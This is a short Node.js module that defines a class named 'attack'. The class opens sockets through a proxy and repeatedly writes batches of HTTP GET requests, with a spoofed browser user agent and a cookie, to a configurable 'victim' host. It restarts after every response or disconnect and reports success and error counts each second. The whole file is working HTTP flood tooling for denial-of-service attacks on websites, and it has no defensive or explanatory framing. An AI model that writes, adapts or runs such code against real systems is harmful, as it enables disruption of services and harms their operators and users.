const net = require('net');

class attack {
    constructor(userAgents, callback) {
        this.userAgents = userAgents;

        this.isRunning = false;
        this.stats = {
            errors: 0,
            success: 0,
            loop: 0
        };
        this.logInterval = setInterval(() => {
            if (this.isRunning) {
                callback(this.stats);
                this.resetStats();
            }
        }, 1000);
    }

    start(props) {
        this.isRunning = true;
        if (this.isRunning) {
            let socket = net.connect({host: props.proxy.host, port: props.proxy.port});
            socket.once('error', err => {
                this.stats.errors++;
            });
            socket.once('disconnect', () => {
                this.stats.errors++;
                if (this.isRunning)
                    this.start(props);
            });

            socket.once('data', data => {
                this.stats.success++;
                if (this.isRunning)
                    this.start(props);
            });

            this.stats.loop++;

            for (let j = 0; j < props.requests; j++) {
                let userAgent = 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3599.0 Safari/537.36';
                if (!props.victim.host.startsWith('http://') && !props.victim.host.startsWith('https://'))
                    props.victim.host = 'http://' + props.victim.host;
                socket.write(`GET ${props.victim.host} HTTP/1.1\r\nHost: ${props.victim.host.split('//')[1].split('/')[0]}\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3\r\nUser-Agent: ${userAgent}\r\nUpgrade-Insecure-Requests: 1\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: en-US,en;q=0.9\r\nCache-Control: max-age=0\r\nCookie: ${props.cookie}\r\n\r\n`);
            }
        }
    }

    stop() {
        this.isRunning = false;
        this.resetStats();
    }

    resetStats() {
        this.stats = {
            errors: 0,
            success: 0,
            loop: 0
        };
    }
}

module.exports = attack;